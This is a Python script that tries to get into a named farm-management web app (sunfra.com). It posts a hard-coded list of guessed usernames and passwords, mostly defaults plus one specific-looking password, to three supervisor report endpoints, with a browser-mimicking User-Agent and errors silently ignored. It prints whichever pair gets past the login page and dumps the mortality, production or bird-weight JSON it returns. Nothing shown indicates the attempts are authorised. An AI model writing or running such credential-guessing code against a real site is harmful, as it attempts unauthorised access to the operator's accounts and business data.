"""
Attempt login to sunfra.com farm app and fetch JSON output for yesterday (13 Aug 2026).
"""
import urllib.request, urllib.parse, http.cookiejar, json, sys
sys.stdout.reconfigure(encoding='utf-8')

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded'
}

candidates = [
    ('admin', 'admin'),
    ('admin', 'sunfra'),
    ('kusum', 'kusum'),
    ('kusum', 'Kusum@2026Bb!'),
    ('kusum', 'kusum123'),
    ('sunfra', 'sunfra'),
    ('supervisor', 'supervisor')
]

urls = [
    "https://sunfra.com/farm/sunfra/supervisor/supervisor_shead_mortality_json_to_web.php",
    "https://sunfra.com/farm/sunfra/supervisor/supervisor_shead_production_json_to_web.php",
    "https://sunfra.com/farm/sunfra/supervisor/supervisor_birds_weight_json_to_web.php"
]

for user_val, pass_val in candidates:
    post_data = urllib.parse.urlencode({'username': user_val, 'password': pass_val, 'remember_me': '1'}).encode('utf-8')
    for url in urls:
        target_url = f"{url}?date=2026-08-13"
        try:
            req = urllib.request.Request(target_url, data=post_data, headers=headers)
            with opener.open(req, timeout=8) as resp:
                raw = resp.read().decode('utf-8', errors='ignore')
                if '<title>Login' not in raw and len(raw) > 5:
                    print(f"🎉 LOGIN SUCCESS with user: '{user_val}' pass: '{pass_val}' on {target_url}!")
                    print("JSON Data:")
                    print(raw[:1000])
                    break
        except Exception as e:
            pass

